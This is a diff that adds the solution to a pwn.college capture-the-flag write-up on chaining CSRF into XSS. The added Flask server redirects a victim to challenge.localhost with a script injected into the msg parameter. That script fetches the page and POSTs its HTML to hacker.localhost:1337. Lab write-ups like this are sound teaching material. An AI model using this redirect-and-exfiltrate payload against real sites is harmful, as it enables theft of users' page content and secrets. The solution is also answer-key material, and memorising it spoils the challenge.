@@ -178,3 +178,30 @@ So, now how would you get the flag with your CSRF-to-XSS shenanigans? Luckily, y
 
 ## Solution
 
+Hacker Server Code:
+
+1. redirect to the `/ephemeral` endpoint of `challenge.localhost` host with injected javascript
+1. this script will fetch the html file of `/` endpoint of `challenge.localhost` host and then send it back to hacker server
+
+```python
+#!/opt/pwn.college/python
+
+import tempfile
+import flask
+import os
+
+app = flask.Flask(__name__)
+
+app.config['WTF_CSRF_ENABLED'] = False
+
+@app.route("/", methods=["GET", "POST"])
+def root():
+    if flask.request.method == "GET":
+        xss = "<script> fetch(`/`) .then(res => res.text()) .then(content => { return fetch(`http://hacker.localhost:1337`, { method: `POST`, body: content }); }); </script>"
+        return flask.redirect("http://challenge.localhost:80/ephemeral?msg=" + xss, code=301)
+
+
+    data = flask.request.data.decode("utf-8")
+    print(data)
+    return ""
+```
